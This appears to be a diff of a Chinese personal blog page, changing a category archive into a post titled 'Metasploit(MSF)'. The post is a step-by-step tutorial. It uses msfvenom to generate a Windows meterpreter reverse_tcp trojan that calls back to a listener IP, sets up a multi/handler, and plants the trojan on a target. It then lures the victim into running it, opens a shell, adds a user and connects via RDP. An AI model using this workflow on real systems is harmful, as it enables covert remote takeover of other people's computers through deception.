@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Category: 学习笔记 | EkEk的个人博客</title>
+  <title>Metasploit(MSF) | EkEk的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="EkEk的个人博客">
-<meta property="og:url" content="http://yoursite.com/categories/学习笔记/index.html">
+  <meta name="description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
+<meta name="keywords" content="MSF,Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit(MSF)">
+<meta property="og:url" content="http://yoursite.com/2019/03/14/Metasploit-MSF/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-14T12:41:43.390Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="EkEk的个人博客">
+<meta name="twitter:title" content="Metasploit(MSF)">
+<meta name="twitter:description" content="综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole  利用MSF生成木马获取meterpreter反弹shell 1msfvenom -p windows/meterpreter/reverse_tcp l">
   
     <link rel="alternative" href="/atom.xml" title="EkEk的个人博客" type="application/atom+xml">
   
@@ -150,36 +155,97 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Metasploit-MSF" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/14/Metasploit-MSF/" class="archive-article-date">
-  	<time datetime="2019-03-14T06:03:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/14/Metasploit-MSF/">Metasploit(MSF)</a>
+    <h1 class="article-title" itemprop="name">
+      Metasploit(MSF)
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/03/14/Metasploit-MSF/" class="archive-article-date">
+  	<time datetime="2019-03-14T06:03:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p>
+<p>kali集成了Metasploit框架，依赖于postgresql数据库</p>
+<ol>
+<li><p>先启动数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动MSF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用MSF生成木马获取meterpreter反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure>
+<p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p>
+</li>
+<li><p>投放木马到目标机上</p>
+</li>
+<li><p>启用MSF，具体操作如下：</p>
+<ol>
+<li><p>加载expuse </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>加载payload（要和生成木马选用的payload一致）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看哪些参数是需要输入的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>诱导用户点击我们的木马程序</p>
+</li>
+<li><p>等待用户上线，就能得到meterpreter,</p>
+</li>
+<li><p>执行shell 进到被攻击者电脑的终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加添加用户  开机3389 连接桌面(</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,7 +257,7 @@
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -204,172 +270,104 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/14/Metasploit-MSF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/14/centos7使用firewalld/" class="archive-article-date">
-  	<time datetime="2019-03-14T05:54:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/14/centos7使用firewalld/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">centos7使用firewalld</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/14/centos7使用firewalld/">centos7使用firewalld</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">firewalld,防火墙,centos7</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/14/HTML基础/" class="archive-article-date">
-  	<time datetime="2019-03-14T02:16:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/14/HTML基础/">HTML基础</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HTML,css,js</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/13/利用github-pages-hexo搭建个人博客/" class="archive-article-date">
-  	<time datetime="2019-03-13T12:55:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/13/利用github-pages-hexo搭建个人博客/">2019-03-13-利用github pages+hexo搭建个人博客</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">github</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">教程</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -392,10 +390,10 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
-		isCategory: true,
+		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
 		root: "/",
